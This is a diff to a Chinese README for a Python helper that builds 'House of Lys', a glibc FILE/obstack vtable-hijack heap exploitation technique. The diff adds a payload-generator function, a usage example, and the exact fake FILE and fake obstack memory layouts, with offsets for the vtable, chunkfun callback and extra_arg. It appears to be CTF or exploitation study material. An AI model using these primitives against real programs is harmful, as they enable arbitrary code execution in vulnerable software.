@@ -51,7 +51,12 @@ primary overflow(+0x18) = 原表 xsputn(+0x38)
 
 ## Python 离线板子
 
-[`lys.py`](./lys.py) 提供 `build_house_of_lys`，生成 Lys 的错位 primary vtable 和 fake obstack 参数。
+[`lys.py`](./lys.py) 提供两个函数：
+
+```text
+build_house_of_lys         -> 返回 LysPlan
+build_house_of_lys_payload -> 返回 FILE 字段镜像 + fake obstack 镜像
+```
 
 ### 函数用途
 
@@ -75,7 +80,7 @@ primary vtable 统一再加 `+0x20`，让 overflow 槽落到 xsputn。
 ### 最小使用示例
 
 ```python
-from lys import build_house_of_lys
+from lys import build_house_of_lys, build_house_of_lys_payload
 
 plan = build_house_of_lys(
     version="2.24",
@@ -88,6 +93,17 @@ plan = build_house_of_lys(
 # 返回 LysPlan；primary_vtable_addr 是 _IO_obstack_jumps+0x20
 print(hex(plan.primary_vtable_addr), hex(plan.obstack_addr),
       hex(plan.chunkfun_addr), hex(plan.extra_arg))
+
+writes = build_house_of_lys_payload(
+    version="2.24",
+    file_addr=0x100000,
+    wfile_jumps_addr=0x7fff0000,
+    obstack_addr=0x200000,
+    chunkfun_addr=0x401234,
+    extra_arg=0x500000,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
 
 ### 参数
@@ -111,6 +127,22 @@ print(hex(plan.primary_vtable_addr), hex(plan.obstack_addr),
 | `object_base` / `next_free` / `chunk_limit` | obstack 当前 chunk 边界。 |
 | `chunkfun_addr` | 分配回调地址。 |
 | `extra_arg` | callback 第一个参数。 |
+
+### 返回对象 `MemoryWrite`
+
+`build_house_of_lys_payload` 返回两项写入：
+
+```text
+1. file_addr -> 0xe8 字节 FILE 字段镜像
+       +0xd8  primary vtable = _IO_obstack_jumps + 0x20
+       +0xe0  obstack 指针 = obstack_addr
+
+2. obstack_addr -> 0x70 字节 fake obstack 镜像
+       +0x38  chunkfun
+       +0x40  extra_arg
+       +0x50  use_extra_arg = 1
+       +0x58/+0x60/+0x68  object_base / next_free / chunk_limit
+```
 
 ### 调用者必须提供
 
